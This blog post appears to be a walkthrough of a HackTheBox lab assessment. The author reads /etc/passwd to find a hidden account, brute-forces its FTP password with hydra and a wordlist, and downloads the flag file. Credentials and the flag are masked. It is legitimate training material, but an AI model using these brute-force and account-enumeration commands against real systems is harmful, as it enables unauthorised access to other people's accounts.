---
title: 'HTB - Login Brute Forcing Module - Skills Assessment Part 2'
date: '2025-12-16T16:01:00+00:00'
author: Ryan
layout: post
draft: false
categories:
    - penetration-testing
    - infosec
    - hackthebox
---

# HackTheBox Login Brute Force - Skills Assessment Part 2

This is part of a multi-part series documenting my process for completing the HackTheBox modules.

This particular post will cover part 2 of the 2 part skills assessment.

## What is the username of the ftp user you find via brute-forcing?

We can review `/etc/passwd` to see the ftp user.

```bash
myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
ftp:x:105:107:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
myuser:x:1000:1000::/home/myuser:/bin/bash
<***********>:x:1001:1001::/var/.hidden:/bin/bash
```

We then need to get the password for the ftp user (again, using a provided passwords file on the server just brute forced into). 

We can use `hydra` again to brute force the ftp login.
```bash
myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ hydra -l ******** -P passwords.txt -V localhost ftp
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-12-16 03:39:39
[DATA] max 16 tasks per 1 server, overall 16 tasks, 198 login tries (l:1/p:198), ~13 tries per task
[DATA] attacking ftp://localhost:21/
......
[ATTEMPT] target localhost - login "********" - pass "dragon" - 47 of 198 [child 4] (0/0)
[ATTEMPT] target localhost - login "********" - pass "1q2w3e4r" - 48 of 198 [child 5] (0/0)
[21][ftp] host: localhost   login: *******   password: ***********
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-16 03:39:50
```

## What is the flag contained within flag.txt

We can now login to ftp with the found credentials and get the flag.
```bash
myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ ftp ********@localhost
Trying [::1]:21 ...
Connected to localhost.
220 (vsFTPd 3.0.5)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||39704|)
150 Here comes the directory listing.
-rw-------    1 1001     1001           28 Sep 10  2024 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||47992|)
150 Opening BINARY mode data connection for flag.txt (28 bytes).
100% |*******************************************************************************************************************|    28      719.57 KiB/s    00:00 ETA
226 Transfer complete.
28 bytes received in 00:00 (239.85 KiB/s)
ftp> exit
221 Goodbye.
myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ cat flag.txt
HTB{************************}myuser@ng-2320105-loginbfsatwo-pep3o-698f9ff849-p4dwn:~$ ^C
myuser@ng-2320105-loginbfmyuser-pep3o-698f9ff849-p4dwn:~$ exit
```

Done.

